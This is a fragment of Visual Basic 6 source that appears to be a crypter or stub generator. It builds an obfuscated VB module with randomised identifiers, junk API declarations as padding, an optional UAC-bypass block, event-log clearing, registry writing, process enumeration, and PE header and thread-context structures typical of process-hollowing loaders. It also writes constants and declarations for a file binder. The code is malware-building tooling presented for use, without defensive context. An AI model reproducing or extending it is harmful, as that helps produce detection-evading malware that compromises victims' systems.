Dim f_type3 As String   'RECT
Dim f_type4 As String   'SYSTEMTIME
Dim f_type5 As String   'APPBARDATA
Dim f_type6 As String   'RGNDATAHEADER
Dim f_type7 As String   'RGNDATA
Dim f_type8 As String   'SECURITY_ATTRIBUTES
Dim f_type9 As String   'POINTAPI
Dim f_type10 As String  'SID_IDENTIFIER_AUTHORITY
Dim f_type11 As String  'CRITICAL_SECTION
Dim f_type12 As String

' ---------------------------

' ****************************

RndStrings f_type1
RndStrings f_type2
RndStrings f_type3
RndStrings f_type4
RndStrings f_type5
RndStrings f_type6
RndStrings f_type7
RndStrings f_type8
RndStrings f_type9
RndStrings f_type10
RndStrings f_type11
RndStrings f_type12

 a = "Attribute VB_Name = " & """" + GenNumKey(15) + """" + vbCrLf
           
a = a + "Public Declare Function " + ApiNames(1) + "  Lib ""shell32.dll"" Alias ""ShellExecuteA"" (ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As String, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long) As Long" & vbCrLf
a = a + "Public Declare Sub " + ApiNames(2) + "  Lib ""kernel32"" (ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long)" & vbCrLf
a = a + "Public Declare Function LoadLibraryA Lib ""kernel32"" Alias ""LoadLibraryA"" (ByVal " + GenNumKey(RandomNumber(18, 4)) + " As String) As Long" & vbCrLf
a = a + "Public Declare Function CallWindowProcA Lib ""user32"" Alias ""CallWindowProcA""(ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long) As Long" & vbCrLf
a = a + "Public Declare Function GetProcAddress Lib ""kernel32"" Alias ""GetProcAddress"" (ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As String) As Long" & vbCrLf
a = a + "Public Declare Function BackupEventLog Lib ""advapi32.dll"" Alias ""BackupEventLogA"" (ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As String) As Long" & vbCrLf
a = a + "Public Declare Function InterlockedDecrement Lib ""kernel32"" (" + GenNumKey(RandomNumber(18, 4)) + " As Long) As Long" & vbCrLf
a = a + "Public Declare Function IsCharLower Lib ""user32"" Alias ""IsCharLowerA"" (ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Byte) As Long" & vbCrLf
a = a + "Public Declare Function SetTextColor Lib ""gdi32"" (ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long) As Long" & vbCrLf
a = a + "Public Declare Sub SetLastError Lib ""kernel32"" (ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long)" & vbCrLf
a = a + "Public Declare Function ClearEventLog Lib ""advapi32.dll"" Alias ""ClearEventLogA"" (ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As String) As Long" & vbCrLf
a = a + "Public Declare Function ClipCursor Lib ""user32"" (" + GenNumKey(RandomNumber(18, 4)) + " As Any) As Long" & vbCrLf
a = a + "Public Declare Function GetVersionEx Lib ""kernel32"" Alias ""GetVersionExA"" (lpVersionInformation As " + TxtType(0) + ") As Long" & vbCrLf
a = a + "Public Declare Sub CpyMem Lib ""kernel32"" Alias ""RtlMoveMemory"" (" + GenNumKey(RandomNumber(18, 4)) + " As Any, " + GenNumKey(RandomNumber(18, 4)) + " As Any, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long)" & vbCrLf
a = a + "Public Declare Function RegOpenKeyEx Lib ""advapi32.dll"" Alias ""RegOpenKeyExA"" (ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long" & vbCrLf

a = a + "Public Declare Function RegSetValueExA Lib ""advapi32.dll"" (ByVal lsdfjoaiw34r As Long, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As String, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long, ByRef lpData As Long, ByVal cbData As Long) As Long" & vbCrLf
a = a + "Public Declare Function RegSetValueEx Lib ""advapi32.dll"" Alias ""RegSetValueExA"" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long" & vbCrLf

a = a + "Public Declare Function RegCloseKey Lib ""advapi32.dll"" (ByVal lsdfjoaiw34r As Long) As Long" & vbCrLf
a = a + "Public Declare Function RegQueryValueEx Lib ""advapi32.dll"" Alias ""RegQueryValueExA"" (ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As String, ByVal lpReserved As Long, " + GenNumKey(RandomNumber(18, 4)) + " As Long, " + GenNumKey(RandomNumber(18, 4)) + " As Any, " + GenNumKey(RandomNumber(18, 4)) + " As Long) As Long         ' Note that if you declare the lpData parameter as String, you must pass it By Value." & vbCrLf
a = a + "Public Declare Function RegOpenKey Lib ""advapi32.dll"" Alias ""RegOpenKeyA"" (ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long, ByVal lpSubKey As String, " + GenNumKey(RandomNumber(18, 4)) + " As Long) As Long" & vbCrLf
a = a + "Public Declare Function GetUserName Lib ""advapi32.dll"" Alias ""GetUserNameA"" (ByVal " + GenNumKey(RandomNumber(18, 4)) + " As String, " + GenNumKey(RandomNumber(18, 4)) + " As Long) As Long" & vbCrLf
a = a + "Public Declare Function CopyFile Lib ""kernel32"" Alias ""CopyFileA"" (ByVal " + GenNumKey(RandomNumber(18, 4)) + " As String, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As String, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long) As Long" & vbCrLf

Sleep (500)

'Bypass UAC
If Check19.Value = 1 Then
a = a + "Public Declare Function AdjustTokenPrivileges Lib ""advapi32.dll"" (ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long, NewState As " + Var14 + ", ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long, PreviousState As " + Var14 + ", " + GenNumKey(RandomNumber(18, 4)) + " As Long) As Long" & vbCrLf
a = a + "Public Declare Function LookupPrivilegeValue Lib ""advapi32.dll"" Alias ""LookupPrivilegeValueA"" (ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Any, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As String, lpLuid As " + Var12 + ") As Long" & vbCrLf
End If

a = a + "Public Declare Function OpenProcessToken Lib ""advapi32.dll"" (ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long, " + GenNumKey(RandomNumber(18, 4)) + " As Long) As Long" & vbCrLf
a = a + "Public Declare Function GetCurrentProcess Lib ""kernel32"" () As Long" & vbCrLf
a = a + "public Declare Function GetModuleHandleA Lib ""kernel32"" (ByVal " + GenNumKey(RandomNumber(20, 3)) + " As String) As Long" & vbCrLf
a = a + "Public Declare Function MoveFile Lib ""kernel32"" Alias ""MoveFileA"" (ByVal " + GenNumKey(RandomNumber(20, 3)) + " As String, ByVal " + GenNumKey(RandomNumber(20, 3)) + " As String) As Long" & vbCrLf
a = a + "Public Declare Function FindWindowEx Lib ""user32"" Alias ""FindWindowExA"" (ByVal " + GenNumKey(RandomNumber(20, 3)) + " As Long, ByVal " + GenNumKey(RandomNumber(20, 3)) + " As Long, ByVal " + GenNumKey(RandomNumber(20, 3)) + " As String, ByVal " + GenNumKey(RandomNumber(20, 3)) + " As String) As Long" & vbCrLf
a = a + "Public Declare Function GetDriveType Lib ""kernel32"" Alias ""GetDriveTypeA"" (ByVal " + GenNumKey(RandomNumber(20, 3)) + " As String) As Long" & vbCrLf
a = a + "Public Declare Function EnableWindow Lib ""user32"" Alias ""EnableWindow"" (ByVal " + GenNumKey(RandomNumber(20, 3)) + " As Long, ByVal " + GenNumKey(RandomNumber(20, 3)) + " As Long) As Long" & vbCrLf
a = a + "Public Declare Function FindWindow Lib ""user32"" Alias ""FindWindowA"" (ByVal " + GenNumKey(RandomNumber(20, 3)) + " As String, ByVal " + GenNumKey(RandomNumber(20, 3)) + " As String) As Long" & vbCrLf & vbCrLf

a = a + "Public Declare Function GetConsoleCP Lib ""kernel32"" () As Long" + S1
a = a + "Public Declare Function GetComputerName Lib ""kernel32"" Alias ""GetComputerNameA"" (ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As String, " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long) As Long" + S1
a = a + "Public Declare Function GetCompressedFileSize Lib ""kernel32"" Alias ""GetCompressedFileSizeA"" (ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As String, " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long) As Long" + S1
a = a + "Public Declare Function FormatMessage Lib ""kernel32"" Alias ""FormatMessageA"" (ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, " + GenNumKey(RandomNumber(12, 9), 4) + "  As Any, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As String, ByVal nSize As Long, Arguments As Long) As Long" + S1
a = a + "Public Declare Function EscapeCommFunction Lib ""kernel32"" (ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long) As Long" + S1
a = a + "Public Declare Sub DeleteCriticalSection Lib ""kernel32"" (" + GenNumKey(RandomNumber(12, 9), 4) + "  As " + f_type11 + ")" + S1
a = a + "Public Declare Function midiStreamStop Lib ""winmm.dll"" (ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long) As Long" + S1
a = a + "Public Declare Function AllocateAndInitializeSid Lib ""advapi32.dll"" (" + GenNumKey(RandomNumber(12, 9), 4) + "  As " + f_type10 + ", ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Byte, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal nSubAuthority6 As Long, ByVal nSubAuthority7 As Long, lpPSid As Long) As Long" + S1
a = a + "Public Declare Function AngleArc Lib ""gdi32"" (ByVal hdc As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Double, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Double) As Long" + S1
a = a + "Public Declare Function SetTextJustification Lib ""gdi32"" (ByVal hdc As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long) As Long" + S1
a = a + "Public Declare Function ModifyMenu Lib ""user32"" Alias ""ModifyMenuA"" (ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal wFlags As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Any) As Long" + S1
a = a + "Public Declare Function LoadBitmap Lib ""user32"" Alias ""LoadBitmapA"" (ByVal hInstance As Long, ByVal lpBitmapName As String) As Long" + S1
a = a + "Public Declare Function LoadImage Lib ""user32"" Alias ""LoadImageA"" (ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As String, ByVal un1 As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal un2 As Long) As Long" + S1
a = a + "Public Declare Function HeapSize Lib ""kernel32"" (ByVal hHeap As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, " + GenNumKey(RandomNumber(12, 9), 4) + "  As Any) As Long" + S1
a = a + "Public Declare Function GetUserDefaultLangID Lib ""kernel32"" () As Integer" + S1

a = a & "Public Declare Function IsUserAnAdmin Lib ""shell32"" () As Long" & vbCrLf
a = a & "Public Declare Function " & Api1 & " Lib ""advapi32.dll"" Alias ""RegCreateKeyA"" (ByVal " & StuVar1 & "  As Long, ByVal lpSubKey As String, phkResult As Long) As Long" & vbCrLf

a = a & "Public Const " & H_K_C_U & "  = &H80000001" & vbCrLf
a = a & "Public Const " & H_K_L_M & "  = &H80000002" & vbCrLf
a = a & "Public Const " & Reg_SZ & "  = 1&" & vbCrLf

Sleep (500)

a = a + "Public Declare Function OpenProcess Lib ""kernel32"" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long" & vbCrLf
a = a + "Public Declare Function AddPrintProcessor Lib ""winspool.drv"" Alias ""AddPrintProcessorA"" (ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As String, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As String, ByVal pPathName As String, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As String) As Long" + S1
a = a + "Public Declare Function auxGetNumDevs Lib ""winmm.dll"" () As Long" + S1
a = a + "Public Declare Function CancelDC Lib ""gdi32"" (ByVal hdc As Long) As Long" + S1
a = a + "Public Declare Function CheckRadioButton Lib ""user32"" Alias ""CheckRadioButtonA"" (ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long) As Long" + S1
a = a + "Public Declare Function EmptyClipboard Lib ""user32"" () As Long" + S1
a = a + "Public Declare Function BeginPath Lib ""gdi32"" (ByVal hdc As Long) As Long" + S1
a = a + "Public Declare Function CreateDirectory Lib ""kernel32"" Alias ""CreateDirectoryA"" (ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As String, " + GenNumKey(RandomNumber(12, 9), 4) + "  As " + f_type8 + ") As Long" + S1
a = a + "Public Declare Function CreateDirectoryEx Lib ""kernel32"" Alias ""CreateDirectoryExA"" (ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As String, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As String, " + GenNumKey(RandomNumber(12, 9), 4) + "  As " + f_type8 + ") As Long" + S1
a = a + "Public Declare Function DeleteForm Lib ""winspool.drv"" Alias ""DeleteFormA"" (ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As String) As Long" + S1
a = a + "Public Declare Function DeleteMenu Lib ""user32"" (ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long) As Long" + S1
a = a + "Public Declare Function DeletePrinter Lib ""winspool.drv"" (ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long) As Long" + S1
a = a + "Public Declare Function DlgDirListComboBox Lib ""user32"" Alias ""DlgDirListComboBoxA"" (ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As String, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long) As Long" + S1
a = a + "Public Declare Function DispatchMessage Lib ""user32"" Alias ""DispatchMessageA"" (" + GenNumKey(RandomNumber(12, 9), 4) + "  As MSG) As Long" + S1
a = a + "Public Declare Function ExcludeClipRect Lib ""gdi32"" (ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long, ByVal Y1 As Long, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long, ByVal " + GenNumKey(RandomNumber(18, 4)) + " As Long) As Long" + S1
a = a + "Public Declare Function ExtCreateRegion Lib ""gdi32"" (" + GenNumKey(RandomNumber(12, 9), 4) + "  As " + f_type2 + ", ByVal nCount As Long, lpRgnData As " + f_type7 + ") As Long" + S1
a = a + "Public Declare Sub GetLocalTime Lib ""kernel32"" (lpSystemTime As " + f_type4 + ")" + S1
a = a + "Public Declare Function GetLastError Lib ""kernel32"" () As Long" + S1
a = a + "Public Declare Function HideCaret Lib ""user32"" (ByVal hwnd As Long) As Long" + S1
a = a + "Public Declare Function LookupAccountSid Lib ""advapi32.dll"" Alias ""LookupAccountSidW"" (ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Any, " + GenNumKey(RandomNumber(12, 9), 4) + "  As Any, " + GenNumKey(RandomNumber(12, 9), 4) + "  As Any, " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, " + GenNumKey(RandomNumber(12, 9), 4) + "  As Any, " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, " + GenNumKey(RandomNumber(12, 9), 4) + "  As Integer) As Long" + S1
a = a + "Public Declare Function ScreenToClient Lib ""user32"" (ByVal hwnd As Long, lpPoint As " + f_type9 + ") As Long" + S1
a = a + "Public Declare Function SHAppBarMessage Lib ""shell32.dll"" (ByVal dwMessage As Long, pData As " + f_type5 + ") As Long" + S1
a = a + "Public Declare Function SetWinMetaFileBits Lib ""gdi32"" (ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, " + GenNumKey(RandomNumber(12, 9), 4) + "  As Byte, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, " + GenNumKey(RandomNumber(12, 9), 4) + "  As " + f_type1 + ") As Long" + S1
a = a + "Public Declare Function TranslateAccelerator Lib ""user32"" Alias ""TranslateAcceleratorA"" (ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, " + GenNumKey(RandomNumber(12, 9), 4) + "  As MSG) As Long" + S1
a = a + "Public Declare Function TrackPopupMenu Lib ""user32"" (ByVal hMenu As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, ByVal " + GenNumKey(RandomNumber(12, 9), 4) + "  As Long, " + GenNumKey(RandomNumber(12, 9), 4) + "  As " + f_type3 + ") As Long" + S1
a = a + "Public Declare Function VkKeyScan Lib ""user32"" Alias ""VkKeyScanA"" (ByVal " + GenNumKey(RandomNumber(12, 9), 4) + " As Byte) As Integer" + S1
a = a + "Public Declare Function WaitMessage Lib ""user32"" () As Long" + S1

a = a + "Public Declare Function CloseHandle Lib ""kernel32"" (ByVal hObject As Long) As Long" & vbCrLf
a = a + "Public Declare Function EnumProcesses Lib ""PSAPI.DLL"" (lpidProcess As Long, ByVal cb As Long, cbNeeded As Long) As Long" & vbCrLf
a = a + "Public Declare Function EnumProcessModules Lib ""PSAPI.DLL"" (ByVal hProcess As Long, lphModule As Long, ByVal cb As Long, lpcbNeeded As Long) As Long" & vbCrLf
a = a + "Public Declare Function GetModuleBaseName Lib ""PSAPI.DLL"" Alias ""GetModuleBaseNameA"" (ByVal hProcess As Long, ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long" & vbCrLf

a = a + "Public Const " & P_V_R & " = &H10" & vbCrLf
a = a + "Public Const " & P_Q_I & " = &H400" & vbCrLf & vbCrLf

Sleep (500)

a = a + "Public Type " + f_type1 + S1
a = a + "       " + GenNumKey(RandomNumber(12, 9), 4) + " As Long" + S1
a = a + "       " + GenNumKey(RandomNumber(12, 9), 4) + " As Long" + S1
a = a + "       " + GenNumKey(RandomNumber(12, 9), 4) + " As Long" + S1
a = a + "       " + GenNumKey(RandomNumber(12, 9), 4) + " As Long" + S1
a = a + "End Type" + S1


a = a + "Public Type " + f_type2 + S1
a = a + "       " + GenNumKey(RandomNumber(12, 9), 4) + " As Double" + S1
a = a + "       " + GenNumKey(RandomNumber(12, 9), 4) + " As Double" + S1
a = a + "       " + GenNumKey(RandomNumber(12, 9), 4) + " As Double" + S1
a = a + "       " + GenNumKey(RandomNumber(12, 9), 4) + " As Double" + S1
a = a + "       " + GenNumKey(RandomNumber(12, 9), 4) + " As Double" + S1
a = a + "       " + GenNumKey(RandomNumber(12, 9), 4) + " As Double" + S1
a = a + "End Type" + S1

a = a + "Public Type " + f_type3 + S1
a = a + "       " + GenNumKey(RandomNumber(12, 9), 4) + " As Long" + S1
a = a + "       " + GenNumKey(RandomNumber(12, 9), 4) + " As Long" + S1
a = a + "       " + GenNumKey(RandomNumber(12, 9), 4) + " As Long" + S1
a = a + "       " + GenNumKey(RandomNumber(12, 9), 4) + " As Long" + S1
a = a + "End Type" + S1

a = a + "Public Type " + f_type4 + S1
a = a + "       " + "wYear As Integer" + S1
a = a + "       " + "wMonth As Integer" + S1
a = a + "       " + "wDayOfWeek As Integer" + S1
a = a + "       " + "wDay As Integer" + S1
a = a + "       " + "wHour As Integer" + S1
a = a + "       " + "wMinute As Integer" + S1
a = a + "       " + "wSecond As Integer" + S1
a = a + "       " + "wMilliseconds As Integer" + S1
a = a + "End Type" + S1 + S1

a = a + "Public Type " + f_type5 + S1
a = a + "       " + "cbSize As Long" + S1
a = a + "       " + "hwnd As Long" + S1
a = a + "       " + "uCallbackMessage As Long" + S1
a = a + "       " + "uEdge As Long" + S1
a = a + "       " + "rc As " + f_type3 + S1
a = a + "       " + "lParam As Long" + S1
a = a + "End Type" + S1 + S1

a = a + "Private Type " + f_type6 + S1
a = a + "       " + "dwSize As Long" + S1
a = a + "       " + "iType As Long" + S1
a = a + "       " + "nCount As Long" + S1
a = a + "       " + "nRgnSize As Long" + S1
a = a + "       " + "rcBound As " + f_type3 + S1
a = a + "End Type" + S1 + S1

a = a + "Private Type " + f_type7 + S1
a = a + "       " + "rdh As " + f_type6 + S1
a = a + "       " + "Buffer As Byte" + S1
a = a + "End Type" + S1

a = a + "Private Type " + f_type8 + S1
a = a + "       " + "nLength As Long" + S1
a = a + "       " + "lpSecurityDescriptor As Long" + S1
a = a + "       " + "bInheritHandle As Long" + S1
a = a + "End Type" + S1 + S1

a = a + "Public Type " + f_type9 + S1
a = a + "       " + "x As Long" + S1
a = a + "       " + "y As Long" + S1
a = a + "End Type" + S1 + S1

a = a + "Private Type MSG" + S1
a = a + "       " + "hwnd As Long" + S1
a = a + "       " + "message As Long" + S1
a = a + "       " + "wParam As Long" + S1
a = a + "       " + "lParam As Long" + S1
a = a + "       " + "time As Long" + S1
a = a + "       " + "pt As " + f_type9 + S1
a = a + "End Type" + S1 + S1

a = a + "Public Type " + f_type10 + S1
a = a + "       " + "Value(6) As Byte" + S1
a = a + "End Type" + S1 + S1

a = a + "Public Type " + f_type11 + S1
a = a + "       " + "dummy As Long" + S1
a = a + "End Type" + S1

' ==============================================================================================================================
' ===============================================================================================================================

'If Check14.Value = 1 Then
'    Dim IntNum As Integer, i As Integer
'    If ComboBox1(4).ListIndex = 0 Then IntNum = RandomNumber(20, 10)
'    If ComboBox1(4).ListIndex = 1 Then IntNum = RandomNumber(45, 30)
'    If ComboBox1(4).ListIndex = 2 Then IntNum = RandomNumber(60, 50)
'
'        For i = 1 To IntNum
'            DoEvents
'            a = a + real_api(i) & vbcrlf
'        Next i
'End If

a = a & vbCrLf + "Public Type fiauhj35qhiwurjn4wer" & vbCrLf
a = a + "cb As Long" & vbCrLf + " end type " & vbCrLf & vbCrLf

a = a + "Public Type fhiuqj34krw" & vbCrLf + RT2 + " As Long: " + RT10 + " As Long " & vbCrLf + "End Type " & vbCrLf & vbCrLf

a = a + "Public Type raijq3ojinrkgiwu3n5jte" & vbCrLf
a = a + RT19 + " As Long: " + RT18 + " As Long: " + RT15 + " As Long: " + RT30 + " As Long: " + RT16 + " As Long: " + RT17 + " As Long: DS As Long: RA(1 To 80) As Byte: CNS As Long" & vbCrLf
a = a + "End Type" & vbCrLf & vbCrLf

a = a + "Public Type mnwui2qj4wr " & vbCrLf
a = a + RT20 + " As Long: " + RT21 + " As Long: " + RT22 + " As Long: " + RT23 + " As Long: " + RT24 + " As Long: " + RT25 + " As Long: " + RT26 + " As Long: " + RT27 + " As raijq3ojinrkgiwu3n5jte: " + RT28 + " As Long: " + RT29 + " As Long: " + RT30 + " As Long: SDs As Long: Edi As Long: Esi As Long: " + RT8 + " As Long: eDx As Long: Ecx As Long: " + RT12 + " As Long: Ebp As Long: Eip As Long: SCs As Long: EFlags As Long: Esp As Long: SSs As Long" & vbCrLf
a = a + "End Type" & vbCrLf & vbCrLf

a = a + "Public Type swhiujk34redre" & vbCrLf
a = a + "e_ma As Integer: e_cb As Integer: e_cp As Integer: e_cr As Integer: e_cpa As Integer: e_min As Integer: e_max As Integer: e_ss As Integer: e_sp As Integer: e_cs As Integer: e_ip As Integer: e_csa As Integer: e_lf As Integer: e_ov As Integer: e_re(0 To 3) As Integer: e_oe As Integer: e_oe2 As Integer: e_re2(0 To 9) As Integer: " + RT1 + " As Long" & vbCrLf
a = a + "End Type" & vbCrLf & vbCrLf

a = a + "Public Type sdhueijn35uekj4rw" & vbCrLf
a = a + "MCH As Integer: " + RT13 + " As Integer: TDS As Long: PTST As Long: NOS2 As Long: SOOH As Integer: chst As Integer" & vbCrLf
a = a + "End Type " & vbCrLf & vbCrLf

a = a + "Public Type pshaiuwjn43wkrfsw" & vbCrLf
a = a + "VA As Long: Sz As Long" & vbCrLf
a = a + "End Type" & vbCrLf & vbCrLf

a = a + "Public Type zsinwj35etuw3454tewe4" & vbCrLf
a = a + "m As Integer: MLV As Byte: MLV2 As Byte: SOC As Long: SOFD As Long: SOUD As Long: " + RT9 + " As Long: BOC As Long: BOD As Long: " + RT4 + " As Long: SA As Long: FA As Long: MOSV As Integer: MOSV2 As Integer: MIV As Integer: MIV2 As Integer: MSV As Integer: MSV2 As Integer: W32VV As Long: " + RT11 + " As Long: " + RT5 + " As Long: CS As Long: SS As Integer: D As Integer: SOSS As Long: SOSC As Long: SOHR As Long: SOHC As Long: LF As Long: NORAZ As Long: DD(0 To 15) As pshaiuwjn43wkrfsw" & vbCrLf
a = a + "End Type" & vbCrLf & vbCrLf

a = a + "Public Type jds4" & vbCrLf
a = a + "s As Long: " + RT14 + " As sdhueijn35uekj4rw: " + RT3 + " As zsinwj35etuw3454tewe4" & vbCrLf
a = a + "End Type" & vbCrLf & vbCrLf

a = a + "Public Type raSDOAIjweor23j9wDji" & vbCrLf
a = a + "SN As String * 8: VS As Long: VA As Long: " + RT7 + " As Long: " + RT6 + " As Long: PTR As Long: PTL As Long: NOR As Integer: NOL As Integer: chst As Long" & vbCrLf
a = a + "End Type" & vbCrLf & vbCrLf
            

          a = a + "Public Type " + TxtType(0) & vbCrLf ' OsVersionInfo
          a = a + vbCr + VarT1 + " as long" & vbCrLf
          a = a + vbCr + VarT2 + " as long" & vbCrLf
          a = a + vbCr + VarT3 + " as long" & vbCrLf
          a = a + vbCr + VarT4 + " as long" & vbCrLf
          a = a + vbCr + Vart5 + " as long" & vbCrLf
          a = a + vbCr + VarT6 + " as string * 128" & vbCrLf
          a = a + "End Type" & vbCrLf


        a = a + "Public Const " + Cst(0).Text + " = ""<h(#Uh(^hfd)""" + vbCrLf + vbCrLf
        a = a + "public Const " + Cst(7) + " = ""<#>""" & vbCrLf
        a = a + "Public Const " + Cst(1).Text + " = ""b/34y98~*N#4)8)""" + vbCrLf
        a = a + "Public Const " + Cst(2).Text + " = ""n*(#Hlkjt0ej""" + vbCrLf + vbCrLf
        a = a + "' Binder's Constants" + vbCrLf
        a = a + "Public Const " + Cst(3).Text + " =""B#dhl4jOl""" + vbCrLf
        a = a + "public const " + Cst(4).Text + "= ""Ndkj*r34o(i>jdkj""" + vbCrLf
        a = a + "public const " + Cst(5).Text + "= ""###""" + vbCrLf
        a = a + "public const " + Cst(6).Text + "= ""Ndkj*r34o(i>jdkj""" + vbCrLf + vbCrLf
        a = a + "' BINDER'S DECLARATIONS" + vbCrLf
        a = a + "Public " + Dec(13).Text + "()" + "as string, " + Dec(14).Text + "()" + " as string ," + Dec(15).Text + "()" + " as string, " + Dec(16).Text + "()" + " as string ," + Dec(17).Text + "()" + " as string ," + Dec(18).Text + "()" + " As string" + vbCrLf
